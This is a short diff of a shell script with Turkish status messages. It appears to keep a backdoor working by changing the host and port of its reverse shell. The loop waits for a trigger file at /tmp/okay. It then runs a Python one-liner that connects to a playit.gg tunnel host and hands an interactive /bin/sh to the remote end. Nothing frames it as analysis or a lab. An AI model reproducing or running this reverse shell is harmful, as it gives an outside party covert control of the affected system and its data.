@@ -14,7 +14,7 @@ echo "SERVIS YENDEN BASLATILDI"
 while true; do
     if [ -e "/tmp/okay" ]; then
         echo "/tmp/okay exists. Sending shell..."
-        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("against-oct.gl.at.ply.gg",11013));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("java-atomic.gl.at.ply.gg",16652));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
         rm /tmp/okay
         sleep 20
     else
